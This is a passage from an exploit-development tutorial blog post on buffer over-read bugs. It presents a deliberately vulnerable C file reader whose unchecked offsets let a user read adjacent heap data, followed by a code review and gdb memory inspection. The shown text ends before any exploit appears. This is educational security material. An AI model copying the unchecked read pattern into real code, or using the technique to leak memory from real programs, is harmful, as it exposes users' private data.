<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv='cache-control' content='no-cache'> 
    <meta http-equiv='expires' content='0'> 
    <meta http-equiv='pragma' content='no-cache'>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content=""
    />
    
      
        <title>[Exploit development] 8- Buffer Over-Read Attacks and Developing a Real Exploit | 0xNinjaCyclone Blog</title>
      
    
    <link rel="stylesheet" href="/css/reset.css"/>
    <link rel="stylesheet" href="/css/font.css"/>
    <link rel="stylesheet" href="/css/smigle2.css"/>
    
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-180x180.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/fav-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/fav-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="safary-1120x1120.png" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
  </head>
  
  <body>
    <div id="root">
      <header>
  <div id="brand">
    <a class="icon-link" href="https://0xninjacyclone.github.io/">
      <img
        class="icon"
        src="/images/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://0xninjacyclone.github.io/"><h1>0xNinjaCyclone Blog</h1></a>
      <h3>Penetration tester and Red teamer</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
    
  </nav>
  <hr />
</header>

      <div id="content">
        
  <main>
    <article>
      <h1 class="title">[Exploit development] 8- Buffer Over-Read Attacks and Developing a Real Exploit</h1>
      
      <div class="post-meta">
  <strong>
    <span>Posted on</span>
    <time>2024-03-04</time>
    <span>in</span>
    
      <a href="/categories/exploitdev">exploitdev</a>
  </strong>
  <span> • 6828 words</span>
  <span> • 33 minute read</span>
  
  
    <div>
      <span>Tags:</span>
      
        <a href="/tags/exploit-development">exploit-development</a>, 
        <a href="/tags/binary-exploitation">binary-exploitation</a>, 
        <a href="/tags/vulnerability-research">vulnerability-research</a>, 
        <a href="/tags/buffer-overread">buffer-overread</a>
    </div>
  
</div>

      <div class="content"><h2 id="intro">Intro</h2>
<p>Welcome to the eighth part of the series on discovering binary application vulnerabilities and developing appropriate exploits. In the previous part, we talked about string format vulnerabilities and how to exploit them in several ways, including leaking sensitive information from private memory. In this part, we will continue to discuss more attacks of this type. We will discuss how to discover these types of vulnerabilities and exploit them optimally. Also, we will apply it to a famous vulnerability that was discovered before. We will analyze it well, and understand its nature and the reason for its occurrence. Based on that, we will develop an exploit to carry out the attack. We will test this exploit in a lab dedicated to applying the attack to it.</p>
<h2 id="vulnerability-definition">Vulnerability definition</h2>
<p>Buffer over-read bugs occur when a program reading data from a buffer overruns the buffer&rsquo;s boundary and tries to read adjacent memory. This may occur when developers rely on poor conditions that are breakable or bypassable, or when the user can somehow control the size of the data to be read and the program does not check the validity of these entries.</p>
<h2 id="vulnerable-example">Vulnerable example</h2>
<p>I have previously prepared code affected by the vulnerability to help us understand the vulnerability and how to test it and benefit from it well.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">readfile</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpFileName, <span style="color:#66d9ef">size_t</span> <span style="color:#f92672">*</span>ulpFileSize)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    FILE <span style="color:#f92672">*</span>fp;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pBuffer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(cpFileName, <span style="color:#e6db74">&#34;rb&#34;</span>)) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fseek</span>(fp, <span style="color:#ae81ff">0L</span>, SEEK_END);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>ulpFileSize <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftell</span>(fp);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fseek</span>(fp, <span style="color:#ae81ff">0L</span>, SEEK_SET);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( pBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#f92672">*</span>ulpFileSize) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fread</span>(pBuffer, <span style="color:#f92672">*</span>ulpFileSize, <span style="color:#ae81ff">1</span>, fp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(fp);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pBuffer;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> cFileName[FILENAME_MAX] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpSecrets[<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> { NULL };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pBuffer <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> ulFrom <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> ulTo <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> ulFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> nArgPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>( <span style="color:#e6db74">&#34;Usage:</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">./FileReader [options] &lt;path/to/file&gt;&#34;</span> );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( nArgPos <span style="color:#f92672">&lt;</span> argc )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>argv[nArgPos] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-&#39;</span> )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( nArgPos<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> argc <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>argv[nArgPos<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-&#39;</span> )
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;[-] There is no value passed for &#39;%s&#39; option!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[nArgPos] );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strcmp</span>(argv[nArgPos]<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;from&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>                ulFrom <span style="color:#f92672">=</span> <span style="color:#a6e22e">atol</span>( argv[<span style="color:#f92672">++</span>nArgPos] );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strcmp</span>(argv[nArgPos]<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;to&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>                ulTo <span style="color:#f92672">=</span> <span style="color:#a6e22e">atol</span>( argv[<span style="color:#f92672">++</span>nArgPos] );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;[-] %s option is not supported!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[nArgPos] );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            nArgPos<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> { 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>cFileName )
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;[-] File path had been specified before &#39;%s&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, cFileName );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">strncpy</span>( cFileName, argv[nArgPos<span style="color:#f92672">++</span>], FILENAME_MAX );
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(<span style="color:#f92672">*</span>cFileName) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;[-] File path had never specified</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(pBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">readfile</span>(cFileName, <span style="color:#f92672">&amp;</span>ulFileSize)) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Failed to read &#39;%s&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, cFileName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( ulTo <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>        ulTo <span style="color:#f92672">=</span> ulFileSize;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Spraying the heap with secrets data
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> ( <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000</span>; i<span style="color:#f92672">++</span> )
</span></span><span style="display:flex;"><span>        cpSecrets[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">strdup</span>( <span style="color:#e6db74">&#34;THIS IS A TOP SECRET DATA *_*</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>( <span style="color:#e6db74">&#34;-----FILE CONTENT-------------------------------------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( ulFrom <span style="color:#f92672">!=</span> ulTo )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fputc</span>( pBuffer[ulFrom<span style="color:#f92672">++</span>], stdout );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>( <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------------------------------------------------------&#34;</span> );
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>( pBuffer );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>temp <span style="color:#f92672">=</span> cpSecrets; <span style="color:#f92672">*</span>temp; temp<span style="color:#f92672">++</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">free</span>( <span style="color:#f92672">*</span>temp );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> EXIT_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is a pretty simple program that reads a specific file based on the user&rsquo;s request and writes its content into <code>stdout</code>. Don&rsquo;t worry we will deeply analyze the code, understand it, and pick up its bugs in an attempt to attack it. Let&rsquo;s run the code:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~/path/to]
└─$ ./FileReader 
Usage:
        ./FileReader [options] &lt;path/to/file&gt;
</code></pre><p>Great, the program takes a file path and some arguments through the command line and based on that do whatever, then exports the result to the screen. Let&rsquo;s give it a test file and see the output:</p>
<pre tabindex="0"><code>┌──(abdallah㉿pc)-[~/path/to]
└─$ ./FileReader ~/test.txt
-----FILE CONTENT-------------------------------------

This is a test file to test buffer over-read vulnerabilities -_-

------------------------------------------------------
</code></pre><p>Fantastic, the program works as expected.</p>
<h2 id="in-depth-analysis">In-depth analysis</h2>
<p>Our goal now is to find a way that allows us to overrun the buffer&rsquo;s boundary and read adjacent memory that we can never access or read. To do this successfully, we need to analyze the program&rsquo;s logic well and figure out all its features. Furthermore, we need to explore and understand how the program expresses its logic and what programming patterns it uses so that we can break it and make it do things it is not supposed to do.</p>
<h3 id="source-code-review">Source code review</h3>
<p>At the beginning, the <code>main</code> function of the program declares some variables with initial values:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> cFileName[FILENAME_MAX] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpSecrets[<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> { NULL };
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pBuffer <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> ulFrom <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> ulTo <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> ulFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> nArgPos <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span></code></pre></div><ul>
<li><strong>cFileName</strong>: The program initialize a zeroed array of characters that will represents later the file&rsquo;s name to be read.</li>
<li><strong>cpSecrets</strong>: An array of string pointers for internal usage <strong>(We will target those later)</strong></li>
<li><strong>pBuffer</strong>: This is a pointer to the file&rsquo;s content.</li>
<li><strong>ulFrom</strong>: This is a variable that tells the program from where should read the data.</li>
<li><strong>ulTo</strong>: This tells the program where the reading should end.</li>
<li><strong>ulFileSize</strong>: This variable should hold the size of the file.</li>
<li><strong>nArgPos</strong>: This variable helps the program to parse the command line arguments.</li>
</ul>
<p>Firstly, the program checks whether there are arguments have been supplied or not.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>( <span style="color:#e6db74">&#34;Usage:</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">./FileReader [options] &lt;path/to/file&gt;&#34;</span> );
</span></span></code></pre></div><p>If there are not any arguments that have been passed through the command line, the program prints a usage guide message on the screen and exits. Otherwise, the program starts parsing the command line arguments as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( nArgPos <span style="color:#f92672">&lt;</span> argc )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>argv[nArgPos] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-&#39;</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( nArgPos<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> argc <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>argv[nArgPos<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-&#39;</span> )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;[-] There is no value passed for &#39;%s&#39; option!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[nArgPos] );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strcmp</span>(argv[nArgPos]<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;from&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>            ulFrom <span style="color:#f92672">=</span> <span style="color:#a6e22e">atol</span>( argv[<span style="color:#f92672">++</span>nArgPos] );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> ( <span style="color:#a6e22e">strcmp</span>(argv[nArgPos]<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;to&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>            ulTo <span style="color:#f92672">=</span> <span style="color:#a6e22e">atol</span>( argv[<span style="color:#f92672">++</span>nArgPos] );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;[-] %s option is not supported!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[nArgPos] );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        nArgPos<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> { 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>cFileName )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;[-] File path had been specified before &#39;%s&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, cFileName );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">strncpy</span>( cFileName, argv[nArgPos<span style="color:#f92672">++</span>], FILENAME_MAX );
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The program iterates over the command line arguments one by one and the <code>nArgPos</code> variable is utilized for that task. Then it checks if the argument starts with <code>-</code> to parse <code>from</code> and <code>to</code> arguments. Otherwise, the program looks for the file path itself and stores it within the <code>cFileName</code> buffer, this operation is protected well against <strong>buffer overflow</strong> attacks since the program prevents writing outside that specialized buffer. After arguments processing is done the program starts preparing for the reading process.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(<span style="color:#f92672">*</span>cFileName) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;[-] File path had never specified</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(pBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">readfile</span>(cFileName, <span style="color:#f92672">&amp;</span>ulFileSize)) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Failed to read &#39;%s&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, cFileName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( ulTo <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>    ulTo <span style="color:#f92672">=</span> ulFileSize;
</span></span></code></pre></div><p>The program performs multiple checks to ensure the inputs are correct. First, it checks whether the filename is specified or not. Then, it starts reading that file via the <code>readfile</code> utility that takes the filename and a variable as a reference to set the size of the read file within. The final check is that if the <code>to</code> argument is never specified, it will be the file size. The program is ready to read the file, but before this step, it does something.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000</span>; i<span style="color:#f92672">++</span> )
</span></span><span style="display:flex;"><span>    cpSecrets[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">strdup</span>( <span style="color:#e6db74">&#34;THIS IS A TOP SECRET DATA *_*</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
</span></span></code></pre></div><p>The program enters a loop that initializes and stores some data within the heap and keeps pointers for them within the stack. Whatever, the program after that starts reading.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>( <span style="color:#e6db74">&#34;-----FILE CONTENT-------------------------------------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> );
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( ulFrom <span style="color:#f92672">!=</span> ulTo )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fputc</span>( pBuffer[ulFrom<span style="color:#f92672">++</span>], stdout );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>( <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------------------------------------------------------&#34;</span> );
</span></span></code></pre></div><p>It enters a loop and keeps iterating over the data where the <code>from</code> argument begins until the <code>to</code> argument, and prints out each byte on the screen one by one.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">free</span>( pBuffer );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>temp <span style="color:#f92672">=</span> cpSecrets; <span style="color:#f92672">*</span>temp; temp<span style="color:#f92672">++</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>( <span style="color:#f92672">*</span>temp );
</span></span></code></pre></div><p>Eventually, the program deallocates the buffer and that secret data and exits after it has completed its task successfully.</p>
<h3 id="debugging-the-program">Debugging the program</h3>
<p>Let&rsquo;s run the program under gdb and see what happens specifically at runtime, what the memory layout will become, where the data is stored, etc.</p>
<pre tabindex="0"><code>gdb -nx -q ./FileReader
set disassembly-flavor intel
b main
r test.txt
</code></pre><p>After that, we set a breakpoint after the <code>readfile</code> function gets called.</p>
<pre tabindex="0"><code>disas main
Dump of assembler code for function main:
.
.
   0x00005555555555c3 &lt;+738&gt;:	call   0x555555555219 &lt;readfile&gt;
   0x00005555555555c8 &lt;+743&gt;:	mov    QWORD PTR [rbp-0x28],rax
   0x00005555555555cc &lt;+747&gt;:	cmp    QWORD PTR [rbp-0x28],0x0
.
.
End of assembler dump.
(gdb) b *0x00005555555555cc
Breakpoint 2 at 0x5555555555cc
(gdb) c
Continuing.

Breakpoint 2, 0x00005555555555cc in main ()
(gdb) 
</code></pre><p>Let us examine the memory to figure out what data are stored within the heap and stack.</p>
<pre tabindex="0"><code>(gdb) x/a $rbp-0x28
0x7fffffffdf38:	0x55555555a490
(gdb) x/s 0x55555555a490
0x55555555a490:	&#34;This is a test file to test buffer over-read vulnerabilities -_-\n&#34;
(gdb) 
</code></pre><p>As shown above, a pointer is saved within the stack refers to a memory somewhere containing the buffer.</p>
<pre tabindex="0"><code>(gdb) info proc mappings 
process 5889
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /home/abdallah/FileReader
      0x555555555000     0x555555556000     0x1000     0x1000 /home/abdallah/FileReader
      0x555555556000     0x555555557000     0x1000     0x2000 /home/abdallah/FileReader
      0x555555557000     0x555555558000     0x1000     0x2000 /home/abdallah/FileReader
      0x555555558000     0x555555559000     0x1000     0x3000 /home/abdallah/FileReader
      0x555555559000     0x55555557a000    0x21000        0x0 [heap]
      0x7ffff7dc8000     0x7ffff7dca000     0x2000        0x0 
      0x7ffff7dca000     0x7ffff7df0000    0x26000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7df0000     0x7ffff7f48000   0x158000    0x26000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7f48000     0x7ffff7f94000    0x4c000   0x17e000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7f94000     0x7ffff7f95000     0x1000   0x1ca000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
      0x7ffff7f95000     0x7ffff7f98000     0x3000   0x1ca000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
